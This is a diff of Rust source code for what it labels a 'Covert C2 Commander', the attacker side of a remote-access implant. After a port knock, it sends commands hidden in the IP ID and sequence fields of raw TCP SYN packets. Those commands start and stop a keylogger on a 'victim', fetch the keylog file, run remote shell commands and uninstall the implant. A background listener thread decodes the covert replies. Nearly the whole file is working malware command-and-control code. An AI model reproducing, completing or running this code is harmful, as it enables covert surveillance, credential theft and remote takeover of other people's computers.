@@ -1,24 +1,25 @@
 use std::io::{self, Write};
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
 use std::net::{IpAddr, Ipv4Addr};
 use std::thread;
 use std::time::Duration;
-use std::sync::atomic::Ordering;
+use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
+use pnet::packet::ip::IpNextHeaderProtocols;
+use pnet::packet::Packet;
 use pnet::datalink;
 
 mod port_knkr;
-mod pcap_capture;
 mod keylogger;
 mod covert;
 
 use port_knkr::KnockSession;
-use pcap_capture::PcapHandle;
-use covert::CovertChannel;
 
-// CRITICAL: Must match Victim's command codes exactly
+// Command Codes
 const CMD_START_LOGGER:     u8 = 0x10;
 const CMD_STOP_LOGGER:      u8 = 0x20;
 const CMD_UNINSTALL:        u8 = 0x30;
-const CMD_REQUEST_KEYLOG:   u8 = 0x50;  // NEW - explicit keylog file request
+const CMD_REQUEST_KEYLOG:   u8 = 0x50;
 
 #[derive(Debug, PartialEq)]
 enum SessionState {
@@ -31,8 +32,9 @@ struct Commander {
     victim_ip: Option<Ipv4Addr>,
     local_ip: Option<Ipv4Addr>,
     knock_session: Option<KnockSession>,
-    pcap_handle: Option<PcapHandle>,
-    covert_chan: Option<CovertChannel>,
+    running: Arc<AtomicBool>,
+    tx_port: u16,
+    rx_port: u16,
 }
 
 impl Commander {
@@ -42,13 +44,53 @@ impl Commander {
             victim_ip: None,
             local_ip: None,
             knock_session: None,
-            pcap_handle: None,
-            covert_chan: None,
+            running: Arc::new(AtomicBool::new(false)),
+            tx_port: 0,
+            rx_port: 0,
+        }
+    }
+
+    /// Direct refactor: Sends data using the covert module's chunking logic
+    fn send_covert_data(&self, payload: &[u8]) {
+        let victim_ip = self.victim_ip.expect("No victim IP");
+        let local_ip = self.local_ip.expect("No local IP");
+        
+        let mut state = covert::SenderState::new_from_bytes(payload);
+        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
+        let (mut tx, mut rx) = transport_channel(65535, protocol).expect("Root required");
+        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
+
+        while state.has_next() && self.running.load(Ordering::SeqCst) {
+            if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
+                let syn_pkt = covert::build_syn_packet(
+                    local_ip, victim_ip,
+                    self.rx_port, 
+                    self.tx_port, 
+                    ip_id, masked_seq
+                );
+                
+                let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), IpAddr::V4(victim_ip));
+
+                // Wait for ACK signature in the RST/ACK packet
+                let start = std::time::Instant::now();
+                while start.elapsed() < Duration::from_millis(400) {
+                    if let Ok((packet, _)) = rx_iter.next() {
+                        if packet.get_source() == victim_ip {
+                            if let Some(recv_id) = covert::parse_rst_ack_ip_id(packet.packet()) {
+                                if recv_id == covert::signature_ip_id(ip_id, raw_word) {
+                                    state.ack();
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
         }
     }
 
     pub fn run(&mut self) {
-        println!("=== C2 Server (Layer 3) ===");
+        println!("=== Covert C2 Commander ===");
         loop {
             match self.state {
                 SessionState::Disconnected => self.disconnected_menu(),
@@ -58,10 +100,8 @@ impl Commander {
     }
 
     fn disconnected_menu(&mut self) {
-        println!("\n--- Status: Offline ---");
-        println!("1) Initiate session (Port Knock)");
+        println!("\n1) Initiate session (Port Knock)");
         println!("0) Exit");
-
         match prompt("Selection > ").as_str() {
             "1" => self.initiate_connection(),
             "0" => std::process::exit(0),
@@ -70,192 +110,99 @@ impl Commander {
     }
 
     fn connected_menu(&mut self) {
-        println!(
-            "\n--- Status: Connected to {} ---",
-            self.victim_ip.map(|ip| ip.to_string()).unwrap_or("Unknown".into())
-        );
-        println!("1) Disconnect from victim");
-        println!("2) Uninstall from victim");
-        println!("3) Start keylogger on victim");
-        println!("4) Stop keylogger on victim");
-        println!("5) Run shell command on victim");
-        println!("6) View Captured Keys");
-        println!("7) Transfer key log file from victim");
-        println!("8) Send file to victim              [partial - needs victim receive logic]");
-        println!("9) Request arbitrary file from victim [placeholder]");
-
+        println!("\n--- Connected to {:?} ---", self.victim_ip);
+        println!("1) Start Keylogger");
+        println!("2) Stop Keylogger");
+        println!("3) Request Keylog File");
+        println!("4) Run Shell Command");
+        println!("5) Uninstall");
+        println!("6) Disconnect");
         match prompt("Selection > ").as_str() {
-            "1" => self.disconnect(),
-            "2" => self.uninstall(),
-            "3" => self.start_keylogger(),
-            "4" => self.stop_keylogger(),
-            "5" => self.run_program(),
-            "6" => self.view_keylog(),
-            "7" => self.request_keylog_file(),
-            "8" => self.send_file_to_victim(),
-            "9" => self.request_arbitrary_file(),
-            _   => println!("[!] Invalid selection"),
+            "1" => self.start_keylogger(),
+            "2" => self.stop_keylogger(),
+            "3" => self.request_keylog_file(),
+            "4" => self.run_program(),
+            "5" => self.uninstall(),
+            "6" => self.disconnect(),
+            _ => println!("[!] Invalid selection"),
         }
     }
 
     fn initiate_connection(&mut self) {
-        let ip_input = prompt("Enter target Victim IP [default: 127.0.0.1]: ");
-        let target_ip = if ip_input.is_empty() {
-            "127.0.0.1".parse::<Ipv4Addr>().unwrap()
-        } else {
-            match ip_input.parse::<Ipv4Addr>() {
-                Ok(ip) => ip,
-                Err(_) => { println!("[!] Invalid IP"); return; }
-            }
-        };
+        let target_ip = prompt("Target IP [127.0.0.1]: ");
+        let ip = target_ip.parse::<Ipv4Addr>().unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
 
-        match port_knkr::port_knock(target_ip) {
+        match port_knkr::port_knock(ip) {
             Ok(session) => {
-                println!("[+] Port knock successful.");
-                self.victim_ip = Some(target_ip);
-
-                let iface_name = Self::find_best_interface(target_ip).unwrap_or_else(|| "lo".to_string());
-                let interfaces = datalink::interfaces();
-                let interface = interfaces.into_iter().find(|i| i.name == iface_name).expect("Interface not found");
-
-                let local_ip = interface.ips.iter()
-                    .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
-                    .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));
-
-                // Initialize L3 Covert Channel
-                let (chan, rx) = CovertChannel::new(
-                    local_ip,
-                    target_ip,
-                    session.tx_port,   // send to victim's rx port
-                    session.rx_port    // listen on this port for victim's data
-                );
-
-                // Start listener thread → prints keys and will save files
-                covert::start_listening(rx, chan.config.clone(), chan.running.clone());
-
-                self.covert_chan = Some(chan);
+                self.victim_ip = Some(ip);
+                self.tx_port = session.tx_port;
+                self.rx_port = session.rx_port;
                 self.knock_session = Some(session);
+                
+                let iface_name = Self::find_best_interface(ip).unwrap_or_else(|| "lo".to_string());
+                let interface = datalink::interfaces().into_iter().find(|i| i.name == iface_name).unwrap();
+                self.local_ip = interface.ips.iter().find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None });
+
+                self.running.store(true, Ordering::SeqCst);
                 self.state = SessionState::Connected;
+                
+                // Spawn the background listener for victim responses/keylogs
+                self.spawn_listener();
+                println!("[+] Session Established.");
             }
             Err(e) => println!("[!] Knock failed: {}", e),
         }
     }
 
-    fn start_keylogger(&mut self) {
-        if let Some(ref mut chan) = self.covert_chan {
-            println!("[*] Sending START_KEYLOGGER (burst for reliability)...");
-            for i in 1..=6 {
-                chan.send_byte(CMD_START_LOGGER);
-                thread::sleep(Duration::from_millis(25));
-                if i % 2 == 0 { print!("."); io::stdout().flush().unwrap(); }
-            }
-            println!("\n[+] Start command sent.");
-        } else {
-            println!("[!] No active session");
-        }
-    }
+    fn spawn_listener(&self) {
+        let running = self.running.clone();
+        let target_ip = self.victim_ip.unwrap();
+        let rx_port = self.rx_port;
 
-    fn stop_keylogger(&mut self) {
-        if let Some(ref mut chan) = self.covert_chan {
-            println!("[*] Sending STOP_KEYLOGGER (burst)...");
-            for _ in 0..5 {
-                chan.send_byte(CMD_STOP_LOGGER);
-                thread::sleep(Duration::from_millis(30));
-            }
-            println!("[+] Stop command sent.");
-        }
-    }
+        thread::spawn(move || {
+            let protocol = Layer3(IpNextHeaderProtocols::Tcp);
+            let (_, mut rx) = transport_channel(65535, protocol).expect("Root required");
+            let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);
+            let mut receiver_state = covert::ReceiverState::new();
 
-    fn request_keylog_file(&mut self) {
-        if let Some(ref mut chan) = self.covert_chan {
-            println!("[*] Requesting keylog file transfer...");
-            for _ in 0..6 {
-                chan.send_byte(CMD_REQUEST_KEYLOG);
-                thread::sleep(Duration::from_millis(35));
-            }
-            println!("[+] Request sent (burst x6). Waiting for transfer...");
-            println!(" → Check terminal for progress. File should save to ./received/");
-        } else {
-            println!("[!] No active session");
-        }
-    }
-
-    fn send_file_to_victim(&mut self) {
-        println!("[!] Send file to victim - NOT FULLY IMPLEMENTED YET");
-        println!("   This requires a new command byte (e.g. 0x60) and receive logic in victim.rs");
-        println!("   For now: enter local path (demo only)");
-        let path = prompt("Local file path to send > ");
-        if path.is_empty() { return; }
-        println!("[*] Would send: {}", path);
-        // Future: chan.send_file(&path) after victim supports receiving
-    }
-
-    fn request_arbitrary_file(&mut self) {
-        println!("[!] Request arbitrary file - NOT IMPLEMENTED YET");
-        println!("   Requires new command + path string sending + victim-side read & send");
-        let _ = prompt("Press ENTER to continue...");
-    }
-
-    fn view_keylog(&self) {
-        println!("\n--- Keylogger Status ---");
-        println!("[*] Real-time keys are printed by the listener thread.");
-        println!("[*] Completed transfers are saved to ./received/ (if listener updated)");
-
-        let path = "./data/pcaps/captured_keys.txt";
-        if std::path::Path::new(path).exists() {
-            println!("[*] Local fallback log found: {}", path);
-            if let Ok(content) = std::fs::read_to_string(path) {
-                println!("\nLast captured content (local):\n{}", content);
-            } else {
-                println!("[!] Could not read local log");
-            }
-        } else {
-            println!("[!] No local log file found yet.");
-        }
-    }
-
-    fn run_program(&mut self) {
-        let cmd = prompt("Remote Shell Command > ");
-        if cmd.is_empty() { return; }
-
-        if let Some(ref mut chan) = self.covert_chan {
-            println!("[*] Sending command...");
-            chan.send_command(&cmd);
-            println!("[+] Command sent. Output should appear in terminal.");
-        }
-    }
-
-    fn uninstall(&mut self) {
-        if let Some(ref mut chan) = self.covert_chan {
-            println!("[!] Sending UNINSTALL command...");
-            chan.send_byte(CMD_UNINSTALL);
-            self.disconnect();
-        }
-    }
-
-    fn disconnect(&mut self) {
-        println!("[*] Cleaning up session...");
-        if let Some(ref chan) = self.covert_chan {
-            chan.stop();
-        }
-        self.knock_session = None;
-        self.covert_chan = None;
-        self.state = SessionState::Disconnected;
-        println!("[+] Session closed.");
-    }
-
-    fn find_best_interface(target_ip: Ipv4Addr) -> Option<String> {
-        let interfaces = datalink::interfaces();
-        for iface in interfaces {
-            if !iface.is_up() || iface.is_loopback() { continue; }
-            for ip_net in &iface.ips {
-                if let IpAddr::V4(_) = ip_net.ip() {
-                    if ip_net.contains(IpAddr::V4(target_ip)) {
-                        return Some(iface.name);
+            while running.load(Ordering::SeqCst) {
+                if let Ok((packet, _)) = rx_iter.next() {
+                    if packet.get_source() == target_ip {
+                        if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
+                            if parsed.dst_port == rx_port {
+                                if let Ok(_) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
+                                    if receiver_state.complete {
+                                        if let Ok(msg) = receiver_state.message_str() {
+                                            println!("\n[Incoming] {}", msg);
+                                        }
+                                        receiver_state = covert::ReceiverState::new();
+                                    }
+                                }
+                            }
+                        }
                     }
                 }
             }
-        }
+        });
+    }
+
+    fn start_keylogger(&mut self) { self.send_covert_data(&[CMD_START_LOGGER]); }
+    fn stop_keylogger(&mut self) { self.send_covert_data(&[CMD_STOP_LOGGER]); }
+    fn request_keylog_file(&mut self) { self.send_covert_data(&[CMD_REQUEST_KEYLOG]); }
+    fn run_program(&mut self) {
+        let cmd = prompt("Command: ");
+        self.send_covert_data(cmd.as_bytes());
+    }
+    fn uninstall(&mut self) {
+        self.send_covert_data(&[CMD_UNINSTALL]);
+        self.disconnect();
+    }
+    fn disconnect(&mut self) {
+        self.running.store(false, Ordering::SeqCst);
+        self.state = SessionState::Disconnected;
+    }
+
+    fn find_best_interface(_target_ip: Ipv4Addr) -> Option<String> {
         datalink::interfaces().into_iter()
             .find(|i| i.is_up() && !i.is_loopback())
             .map(|i| i.name)
